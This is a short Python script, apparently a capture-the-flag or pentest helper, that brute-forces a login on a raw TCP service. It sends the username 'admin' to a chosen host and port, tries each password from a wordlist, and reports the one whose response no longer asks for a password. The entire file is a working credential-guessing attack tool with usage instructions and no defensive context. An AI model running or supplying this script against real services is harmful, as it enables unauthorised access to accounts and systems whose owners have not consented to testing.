import socket
import sys

if len(sys.argv) < 4:
    print("Usage: python socket-fuzzer.py <host> <port> <wordlist>")
    sys.exit(0)

host = sys.argv[1]
port = sys.argv[2]
wordlist = open(sys.argv[3])

def find_password(password):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((host, int(port)))
        s.sendall(b'admin\n')
        s.recv(1024) 
        s.sendall(password.encode() + b'\n')
        response = s.recv(1024).decode()
        s.close()
        if "password" not in response.lower():
            return password
    except (socket.error, socket.timeout):
        print(f"Connection error with password: {password}")
        pass

def main():
    for password in wordlist:
        password = password.strip()
        if not password:
            continue
        result = find_password(password)
        if result:
            print(f"Password found: {result}")
            break
    wordlist.close()

if __name__ == "__main__":
    main()